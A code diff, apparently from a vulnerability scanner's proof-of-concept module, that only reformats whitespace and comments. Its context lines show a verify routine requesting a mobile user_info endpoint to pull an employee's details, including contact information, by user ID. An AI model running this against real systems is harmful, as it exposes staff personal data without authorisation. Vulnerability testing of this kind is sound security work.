@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -59,7 +60,7 @@ class Poc(ABPoc):
             if m == None:
                 return False
             userid = m.group(1)
-            #print userid
+            # print userid
             # 获取员工详细信息(包含联系方式)
             url2 = self.target + '/mobile/user_info/data.php?P=1&ATYPE=getUserInfo&Q_ID=' + userid
             code, head, res, errcode, _ = hh.http(url2)
